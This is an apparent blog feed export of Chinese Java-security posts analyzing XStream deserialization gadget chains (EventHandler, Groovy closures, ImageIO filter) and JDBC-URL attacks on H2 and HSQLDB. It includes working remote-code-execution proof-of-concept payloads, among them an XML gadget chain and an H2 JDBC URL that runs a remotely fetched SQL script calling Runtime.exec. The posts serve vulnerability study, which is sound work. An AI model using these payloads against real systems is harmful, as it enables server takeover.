&amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;iter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;filter class&amp;#x3D;&amp;quot;javax.imageio.ImageIO$ContainsFilter&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;class&amp;gt;java.lang.ProcessBuilder&amp;lt;&amp;#x2F;class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;name&amp;gt;start&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;parameter-types&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;name&amp;gt;foo&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;next class&amp;#x3D;&amp;quot;string&amp;quot;&amp;gt;foo&amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;&amp;#x2F;serviceIterator&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;lock&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;&amp;#x2F;cipher&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;input class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder$NullInputStream&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ibuffer&amp;gt;&amp;lt;&amp;#x2F;ibuffer&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;done&amp;gt;false&amp;lt;&amp;#x2F;done&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ostart&amp;gt;0&amp;lt;&amp;#x2F;ostart&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ofinish&amp;gt;0&amp;lt;&amp;#x2F;ofinish&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;closed&amp;gt;false&amp;lt;&amp;#x2F;closed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;&amp;#x2F;is&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;consumed&amp;gt;false&amp;lt;&amp;#x2F;consumed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;&amp;#x2F;dataSource&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;transferFlavors&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;&amp;#x2F;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataLen&amp;gt;0&amp;lt;&amp;#x2F;dataLen&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;&amp;#x2F;value&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化详解（一）</title>
    <link href="http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-05-08T09:17:00.000Z</published>
    <updated>2021-05-13T07:26:30.081Z</updated>
    
    <content type="html"><![CDATA[<p>XStream 反序列化问题由来已久，从&lt;=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。</p><p>本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。</p><h2 id="1-XStream-原理解析"><a href="#1-XStream-原理解析" class="headerlink" title="1. XStream 原理解析"></a>1. XStream 原理解析</h2><h3 id="1-1-源码解析"><a href="#1-1-源码解析" class="headerlink" title="1.1 源码解析"></a>1.1 源码解析</h3><p>参考【3】<br><img src="/images/pasted-136.png" alt="upload successful"></p><a id="more"></a><h4 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h4><p>Mapper的作用类似alias，即将实际的class与xml元素名称对应起来。例如</p><ul><li>sorted-set对应java.util.SortedSet</li></ul><h5 id="XStream-mapper"><a href="#XStream-mapper" class="headerlink" title="XStream.mapper"></a>XStream.mapper</h5><p>是在<code>XStream.buildMapper()</code>中进行初始化</p><p>通过<code>Class type = HierarchicalStreams.readClassType(reader, mapper)</code>进行调用。</p><h4 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h4><p>Converter字面意义为转换器，负责对每个Java Object进行转换，比如有<code>IntConverter</code>、<code>CharConverter</code>、<code>TreeSetConverter</code>等等</p><h5 id="xstream-converterLookup"><a href="#xstream-converterLookup" class="headerlink" title="xstream.converterLookup"></a>xstream.converterLookup</h5><p>在<code>XStream.setupConverters()</code>中进行初始化</p><p>通过以下方式进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 获取type 类型，type为class，eg java.util.SortdSet</span><br><span class="line">Converter converter = converterLookup.lookupConverterForType(type);</span><br><span class="line"># converter 值为TreeSetConverter</span><br><span class="line">convert(parent, type, converter);</span><br></pre></td></tr></table></figure><h3 id="1-2-SerializableConverter"><a href="#1-2-SerializableConverter" class="headerlink" title="1.2 SerializableConverter"></a>1.2 SerializableConverter</h3><p>简单来讲，如果class 实现了Serializable，那么对应的Converter为SerializableConverter，如果没有，那么就是其他的Converter，依前文<code>lookupConverterForType(type)</code>中的type而定。</p><p>参考【2】中有着一部分的代码及调试，不赘述</p><h3 id="1-3-CustomObjectInputStream"><a href="#1-3-CustomObjectInputStream" class="headerlink" title="1.3 CustomObjectInputStream"></a>1.3 CustomObjectInputStream</h3><p>都知道反序列化是通过 <code>ObjectInputStream.readObject()</code>实现Input转Object的。针对实现了Serializable接口的类，XStream也是通过调用readObject进行转化的，但是Input是xml格式的，如何做到的呢？</p><p><code>ObjectInputStream.readObject()</code>的实现流程如下：<br><img src="/images/pasted-135.png" alt="upload successful"></p><p>可以看到Input会被解析成一个个类似TC_OBJECT的数据结构，Xstream 大致来说是通过CustomObjectInputStream实现这种解析xml结构的。</p><p>需要注意的是CustomObjectInputStream.StreamCallback 接口，在ExternalizableConverter和SerializableConverter 有不同的实现，以SerializableConverter为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CustomObjectInputStream.StreamCallback callback = <span class="keyword">new</span> CustomObjectInputStream.StreamCallback() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readFromStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      reader.moveDown();</span><br><span class="line">      Class type = HierarchicalStreams.readClassType(reader, SerializableConverter.<span class="keyword">this</span>.mapper);</span><br><span class="line">      Object value = context.convertAnother(result, type);</span><br><span class="line">      reader.moveUp();</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-反序列化利用"><a href="#2-反序列化利用" class="headerlink" title="2. 反序列化利用"></a>2. 反序列化利用</h2><p>引用Wh1t3p1g师傅的解释</p><blockquote><p>XStream反序列化同fastjson这种不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都由Java的反射机制来完成，所以并没有这样主动调用的特性。</p></blockquote><blockquote><p>但是还有一种利用方式，回想一下，在几条常规的java反序列化利用链上，都利用了HashMap、PriorityQueue等对象（key不可重复等特性）会自动去调用hashCode、equal、compareTo等这种函数。</p></blockquote><p>讲的很明白了，强调一点：<strong>java反序列化利用链，类必须要可Serializable，但是在Xstream上，并不是必须</strong>，这里是一切利用链的根本原因。</p><ol><li>原Java反序列化链当然可以用</li><li>寻找新的HashMap、PriorityQueue</li></ol><h3 id="2-1-原Java反序列化链"><a href="#2-1-原Java反序列化链" class="headerlink" title="2.1 原Java反序列化链"></a>2.1 原Java反序列化链</h3><p>这里贴一下基于cc7的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Object calc = <span class="keyword">new</span> CommonsCollections7().getObject(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        String xml = xStream.toXML(calc);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        Object cc7 = xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-寻找新的HashMap、PriorityQueue等"><a href="#2-2-寻找新的HashMap、PriorityQueue等" class="headerlink" title="2.2 寻找新的HashMap、PriorityQueue等"></a>2.2 寻找新的HashMap、PriorityQueue等</h3><p>Wh1t3p1g师傅文章中解释了这三个特殊的类</p><ol><li>MapConverter，会调用hashCode</li><li>TreeSet/TreeMapConverter，会调用compareTo</li><li>DynamicProxyConverter，创建了Proxy instance，InvocationHandler可控</li></ol><p>师傅已经讲的很明白了，这里也不多讲，简单解释</p><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><h5 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h5><p>这里涉及到java动态代理知识，用到的是TreeSetConverter+DynamicProxyConverter，poc原文有，就不贴了，简单解释下逻辑如下:</p><ul><li><p>TreeSetConverter 当新插入一个key，会运行key的compareTo方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure></li><li><p>DynamicProxyConverter 实现生成代理类实例，重点是其中的handler可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy = Proxy.newProxyInstance(classLoaderReference.getReference(), interfacesAsArray, handler);</span><br></pre></td></tr></table></figure></li><li><p>EventHandler 就是这样理想的可控InvocationHandler。EventHandler 有属性target&amp;action，其中target为object，action为method，EventHandler 的invoke实现上的逻辑最终会执行action.invoke(target,args)，其中target Demo为ProcessBuilder对象，action为start方法，最终实现RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 伪代码</span><br><span class="line"># proxy.compareTo()</span><br><span class="line"># EventHandler 被代理类会执行 invoke(proxy,&quot;compareTo&quot;,arguments)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span></span><br></pre></td></tr></table></figure></li></ul><p>其实理解了这个的逻辑，下面的几个都比较类似了</p><p>可以看出来，这个利用链的重点是EventHandler</p><h5 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h5><p>Groovy ConvertedClosure 这个链其实和ysoserial 的Groovy1链类似，只不过Handler有点不一样。详细分析可以看看Groovy链的分析，师傅文章里有链接，blog里面也有这个链的简单分析。</p><h6 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h6><p>Wh1t3p1g师傅提到的是这个姿势实现RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure><p>实际上，这样也可以触发（但是不带参数，暂时没找到可以无参数的后续利用链）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call()</span><br></pre></td></tr></table></figure><p>Groovy1链用的就是这种，恰好是无参数的触发。</p><h6 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    ConvertedClosure handler = <span class="keyword">new</span> ConvertedClosure((Closure) mc, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line">    Object map = Proxy.newProxyInstance(</span><br><span class="line">            GroovyConvertedClosure.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparable.class&#125;, handler);</span><br><span class="line">    TreeSet ts = PayloadHelper.makeTreeSet(<span class="string">&quot;open -a calculator.app&quot;</span>, map);</span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(ts);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    </span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h5><blockquote><p>前面用到了TreeSet的方式，这里我们去使用Map的类型来触发。以Map的类型来触发，那就是找可以利用的hashCode函数</p></blockquote><blockquote><p>groovy.util.Expando#hashCode</p></blockquote><p>师傅的思路是从寻找hashCode，往上回溯</p><ol><li>groovy.util.Expando#hashCode 执行了closure.call()，其中closure来源为属性expandoProperties</li><li>TreemapConverter 每次插入obj的时候，都会执行obj.hashCode</li></ol><p>思路很简单，poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">    Expando exp = <span class="keyword">new</span> Expando();</span><br><span class="line">    exp.setProperty(<span class="string">&quot;hashCode&quot;</span>,mc);</span><br><span class="line"></span><br><span class="line">    HashMap tp = PayloadHelper.makeMap(<span class="string">&quot;foo&quot;</span>,exp);</span><br><span class="line"></span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(tp);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中用到的是MapConveter。</p><h5 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. ImageIO$ContainsFilter</h5><p>这个链比较长，思路来源是marshalsec的ImageIO gadget，逆向发现的确很难，Wh1t3p1g师傅也是从正向去跟踪的。</p><p>正向的复现师傅文章里也很详细了，不赘述了。</p><h5 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h5><p>这个链的思路最早【4】中orich1师傅的发现，过程也比较长，重点是从BCEL触发，寻找可用的lass.ForName()利用点，Iterator.next这里开始逆向发现新的链。Wh1t3p1g师傅的实现BCEL也很有亮点，很值得学习。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节简要介绍了XStream的序列化&amp;反序列化的实现原理。java反序列化，类必须要可Serializable，但是在XStream上，并不是必须。针对非Seriablzable的类，XStream引入了多种Conveter实现这一过程。</p><p>其中EventHandler 和Groovy ConvertedClosure 都是利用到了TreeSetConveter &amp; DynamicProxyConverter，Groovy Expando利用到了MapConverter。</p><p>遗留问题：</p><ol><li>gadget 4和5还需要再单独分析分析，Wh1t3p1g师傅的ysomap还有几个gadget，也需要再单独学习学习姿势。</li><li>BCEL 这种通用的利用手法思路，有没有其他的APP。</li><li>XStream 后续的几个CVE</li><li>XStream 的黑名单安全手段，SecurityConveter</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">回顾XStream反序列化漏洞</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li><li>[3] <a href="https://www.jianshu.com/p/387c568faf62">XStream 源码解析</a></li><li>[4] <a href="https://www.anquanke.com/post/id/172198">jenkins 2.101 XStream rce 挖掘思路</a></li><li>[5] <a href="https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/">Jenkins 2.101 XStream Rce[空指针CTF一月内部赛Writeup]</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;XStream 反序列化问题由来已久，从&amp;lt;=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。&lt;/p&gt;
&lt;p&gt;本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。&lt;/p&gt;
&lt;h2 id=&quot;1-XStream-原理解析&quot;&gt;&lt;a href=&quot;#1-XStream-原理解析&quot; class=&quot;headerlink&quot; title=&quot;1. XStream 原理解析&quot;&gt;&lt;/a&gt;1. XStream 原理解析&lt;/h2&gt;&lt;h3 id=&quot;1-1-源码解析&quot;&gt;&lt;a href=&quot;#1-1-源码解析&quot; class=&quot;headerlink&quot; title=&quot;1.1 源码解析&quot;&gt;&lt;/a&gt;1.1 源码解析&lt;/h3&gt;&lt;p&gt;参考【3】&lt;br&gt;&lt;img src=&quot;/images/pasted-136.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc碎碎念三：内存数据库</title>
    <link href="http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2021-04-26T06:10:00.000Z</published>
    <updated>2021-11-25T05:58:45.255Z</updated>
    
    <content type="html"><![CDATA[<p>继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？</p><ol><li>攻击client思路，典型的就是mysql client，前面讲过</li><li>攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势</li></ol><h1 id="攻击内存数据库Server"><a href="#攻击内存数据库Server" class="headerlink" title="攻击内存数据库Server"></a>攻击内存数据库Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>h2_exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;open -a calculator.app&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>python -m SimpleHTTPServer 3333</code></p><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:3333/h2_exec.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection con = DriverManager.getConnection(url);</span><br><span class="line">&#125;<span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-133.png" alt="upload successful"></p><p>tips: <code>java -cp h2.jar org.h2.tools.Server</code>可以开启web console server</p><h2 id="HSQLDB"><a href="#HSQLDB" class="headerlink" title="HSQLDB"></a>HSQLDB</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hsqldb HTTP Server</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.server.WebServer --database.0 file:mydb --dbname.0 xdb</span><br><span class="line"><span class="comment"># 连接</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.util.DatabaseManagerSwing</span><br></pre></td></tr></table></figure><p>浅蓝大佬关于HSQLDB的总结算是见到最全面的相关文章了，详情参考【5】，这里直接给出方法&amp;结论</p><h3 id="1-利用call-java-static-function"><a href="#1-利用call-java-static-function" class="headerlink" title="1. 利用call java static function"></a>1. 利用call java static function</h3><p>利用hsqldb create 